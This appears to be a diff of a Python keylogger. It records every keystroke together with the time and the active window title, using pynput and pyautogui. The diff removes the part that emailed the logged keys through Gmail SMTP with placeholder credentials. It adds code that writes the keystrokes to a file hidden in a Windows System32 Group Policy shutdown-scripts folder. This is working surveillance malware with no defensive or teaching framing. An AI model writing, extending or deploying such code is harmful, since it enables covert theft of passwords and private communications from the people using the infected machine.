@@ -1,31 +1,11 @@
 # Importing libs
 from pynput import keyboard
-from datetime import date, datetime
-from smtplib import SMTP_SSL
+from datetime import datetime
 from pyautogui import getActiveWindowTitle
 from sys import setrecursionlimit
 
-log = ''
-
-# Function to check if it's time to send the log
-def check():
-    global log
-    nlines = log.count('\n')
-    if nlines >= 1000:
-        today = str(date.today())
-        email_text = 'Subject: Your e-mail subject' + today + '\n\n'
-        email_text += log
-        email_text = email_text.encode('utf-8')
-
-        connection = SMTP_SSL('smtp.gmail.com', 465)
-        connection.login('xxxxxxxxxx@gmail.com', 'xxxx xxxx xxxx xxxx') # Your email and Google App passwords created password
-        connection.sendmail('', 'xxxxxxxxxx@gmail.com', email_text)     # Your email again
-        connection.quit()
-        log = ''
-
-# Function to put the date, the name of the active window and the key in the log
+# Function to put the date, the name of the active window and the key in the log file
 def add_log(skey):
-    global log
     current_time = datetime.now()
     current_time_hour = str(current_time.hour)
     current_time_minute = str(current_time.minute)
@@ -33,12 +13,14 @@ def add_log(skey):
     try:
         window_name = getActiveWindowTitle()
     except AttributeError:
-        return False
-    log += "\n" +  current_time_hour + ":" + current_time_minute + ":" + current_time_second + " | " + window_name + ": " + skey
+        window_name = "Window not found"
 
+    file = open('C:\WINDOWS\System32\GroupPolicy\Machine\Scripts\Shutdown\log_file', 'a')
+    file.writelines("\n" +  current_time_hour + ":" + current_time_minute + ":" + current_time_second + " | " + window_name + ": " + skey)
+    file.close()
+    
 # Function that transform what the user types and send it to add_log function
 def press(key):
-    global log
     try:
         if key == keyboard.Key.esc:
             add_log("<esc>")
